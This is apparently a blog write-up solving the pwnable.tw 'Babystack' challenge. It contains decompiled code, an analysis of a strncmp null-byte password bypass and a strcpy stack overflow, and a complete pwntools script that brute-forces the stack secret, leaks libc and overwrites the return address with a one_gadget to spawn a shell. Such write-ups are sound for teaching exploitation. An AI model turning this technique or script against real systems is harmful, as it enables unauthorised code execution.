---
date: '2025-09-01T10:00:35+07:00'
draft: false
title: 'Babystack (250 pts) - pwnable.tw'
tags: ['pwnable.tw']
---
---

## 0x1. Initial Reconnaissance

### file
```bash
↪ file babystack
babystack: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, stripped
```

### checksec
```bash
↪ checksec --file=babystack
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols	Partial	1		4		babystack
```

### ./babystack
```
↪ ./babystack
>> 1
Your passowrd :
```

---

## 0x2. Reverse Engineering

### main
```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  _QWORD *v3; // rcx
  __int64 v4; // rdx
  char v6[64]; // [rsp+0h] [rbp-60h] BYREF
  __int64 buf[2]; // [rsp+40h] [rbp-20h] BYREF
  char v8[16]; // [rsp+50h] [rbp-10h] BYREF

  sub_D30();
  unk_202018 = open("/dev/urandom", 0);
  read(unk_202018, buf, 0x10uLL);
  v3 = qword_202020;
  v4 = buf[1];
  *(_QWORD *)qword_202020 = buf[0];
  v3[1] = v4;
  close(unk_202018);
  do
  {
    while ( 1 )
    {
      write(1, ">> ", 3uLL);
      _read_chk(0LL, v8, 16LL, 16LL);
      if ( v8[0] == 50 )
        break;
      if ( v8[0] == 51 )
      {
        if ( unk_202014 )
          sub_E76(v6);
        else
LABEL_15:
          puts("Invalid choice");
      }
      else
      {
        if ( v8[0] != 49 )
          goto LABEL_15;
        if ( unk_202014 )
          unk_202014 = 0;
        else
          sub_DEF((const char *)buf);
      }
    }
    if ( !unk_202014 )
      exit(0);
  }
  while ( memcmp(buf, qword_202020, 0x10uLL) );
  return 0LL;
}
```

### sub_E76
```c
int __fastcall sub_E76(char *a1)
{
  char src[128]; // [rsp+10h] [rbp-80h] BYREF

  printf("Copy :");
  sub_CA0((unsigned __int8 *)src, 0x3Fu);
  strcpy(a1, src);
  return puts("It is magic copy !");
}
```

### sub_DEF
```c
int __fastcall sub_DEF(const char *a1)
{
  size_t v1; // rax
  char s[128]; // [rsp+10h] [rbp-80h] BYREF

  printf("Your passowrd :");
  sub_CA0((unsigned __int8 *)s, 0x7Fu);
  v1 = strlen(s);
  if ( strncmp(s, a1, v1) )
    return puts("Failed !");
  unk_202014 = 1;
  return puts("Login Success !");
}
```

---

## 0x3. Analysis

In this problem, we have 3 options, choose 1 to input the password up to 128 bytes, 2 to break the first while loop. If you input the right passwords, they will turn ```unk_202014``` to true and allow you to copy 63 bytes to ```v6[64]``` with option 3. The passwords will be stored at ```buf[2]``` on stack and ```qword_202020``` on bss. If you don't wanna stuck in while loop or end the process instantly after breaking the first while loop, you should make sure that ```unk_202014``` is true and the value in ```buf``` and ```qword_202020``` are the same. 

Another noticeable point is that they check the password you input using ```strncmp``` with the length of your input. That means if you input a null value (```\x00```), you can bypass :DD, because ```strlen``` counts til the first null byte.

---

## 0x4. Exploit

I can't think of anything but return address overwritten and buffer overflow. But, to bypass the while loop, I have to have the password. To do that, just brute-force to get the passwords. Because you can input up to 128 bytes to guess the password, at first you can think about brute-force to get return address, which is __libc_call_main, but it's impossible, the last 2 bytes of rbp are null. 

Observe carefully, you can see ```v6[64], buf[2], v8[16], rbp, and return address``` are totally adjecent. And the stack frame of ```sub_E76``` and ```sub_DEF``` are at the same address, ```src[128]``` and ```s[128]``` are at ```rbp-0x80``` too.

Now, look at this:
```
pwndbg> x/2gx $rbp - 0x80 + 0x40
0x7fffffffe540:	0x0000555555400b70	0x00007ffff7878439
pwndbg> vmmap 0x00007ffff7878439
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
    0x555555a00000     0x555555a01000 rw-p     1000    4000 babystack_patched
►   0x7ffff7800000     0x7ffff79bf000 r-xp   1bf000       0 libc_64.so.6 +0x78439
    0x7ffff79bf000     0x7ffff7bbf000 ---p   200000  1bf000 libc_64.so.6
```

Because ```strcpy``` will copy the string until the first null byte. You can use ```sub_DEF``` to input full "A" til ```&s + 0x48```, copy it to ```v6[64]``` to overwrite ```buf[2]```, and brute-force to get IO_new_file_setbuf + 9:DD. Do it again to overwrite one_gadget to return address :b and get the shell.

### Exploit
```py
from pwn import *

exe = ELF("./babystack_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *__libc_start_main+214")
    else:
        r = remote("chall.pwnable.tw", 10205)

    return r

def password (p, password):
    p.sendafter (b'>> ', b'1' + b'A' * 15)
    p.sendafter (b'Your passowrd :', password)

def copy (p, text):
    p.sendafter (b'>> ', b'3' + b'A' * 15)
    p.sendafter (b'Copy :', text)

bad_chars = [
    0x0a  # LF
]

def backtrack (p, first_string, limit):
    result = b''
    cnt = 0
    while True:
        if (cnt == limit):
            break
        for i in range (1, 256):
            if i in bad_chars:
                continue
            password (p, first_string + result + p8 (i) + b'\x00')
            data = p.recv (3)
            # print ("the result is : ", data.re)
            if b'Log' in data:
                result = result + p8(i)
                break
        p.sendafter (b'>> ', b'1')
        cnt += 1

    return result

def main():
    # IO_new_file_setbuf+9
    p = conn()
    password1 = backtrack (p, b'', 8)
    print ("The first password is : ", hex (u64 (password1)))
    password2 = backtrack (p, password1, 8)
    print ("The second password is : ", hex (u64 (password2)))
    
    password (p, b'A' * 64 + b'A' * 8)
    password (p, b'\x00')
    copy (p, b'A')
    p.sendafter (b'>> ', b'1')
    leak_libc = backtrack (p, b'A' * 8, 6) + b'\x00' * 2
    print ("The address of IO_new_file_setbuf+9 is: ", hex (u64 (leak_libc)))
    libc.address = u64 (leak_libc) - libc.symbols['_IO_file_setbuf'] - 9
    print ("The address of libc is : ", hex (libc.address))



    payload = b'A' * 64 + password1 + password2 + b'3' + b'A' * 15 + b'A' * 8 + p64 (libc.address + 0x45216)
    password (p, payload)
    password (p, b'\x00')
    copy (p, b'A')
    p.sendafter (b'>> ', b'2')


    p.interactive()


if __name__ == "__main__":
    main()
```
